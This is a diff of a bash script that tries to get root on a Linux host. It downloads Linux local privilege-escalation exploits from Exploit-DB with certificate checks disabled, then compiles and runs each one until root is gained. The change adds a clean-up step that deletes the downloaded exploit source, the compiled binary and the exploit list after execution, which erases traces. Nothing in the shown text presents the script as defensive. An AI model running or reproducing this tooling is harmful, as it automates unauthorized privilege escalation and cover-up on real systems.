@@ -29,7 +29,7 @@ execute_exploit(){
 	#CC ""
 	echo "[+] Compiling..."
 	CC "-w -lutil -lpthread"
-    CC "-w -m32 -O2 -o exploit"
+	CC "-w -m32 -O2 -o exploit"
 	CC "-w -O2 -o exploit"
 	CC "-w -lkeyutils -w"
 	CC "-w -lpthread"
@@ -45,11 +45,18 @@ execute_exploit(){
 
 download_list(){
 	echo "[+] Downloading list"
-	wget --no-check-certificate $1 -O exploitlist.txt 
+	wget --no-check-certificate $1 -O c_exploitlist.txt 
 }
 download_exploit(){
 	echo "[+] Downloading exploit $1"
 	wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/$1 -O exploit.c -q
+}
+
+clean_up(){
+	rm exploit.c
+	rm exploit
+	rm c_exploitlist.txt
+
 }
 
 main(){
@@ -59,10 +66,8 @@ main(){
 	do
 		download_exploit $line; execute_exploit
 		checkroot
-	done < exploitlist.txt
-	#rm exploit.c
-	#rm exploit
-	#rm exploitlist.txt
+	done < c_exploitlist.txt
+	clean_up
 	echo "[!] Im sorry i could'nt get root..."
 }
 
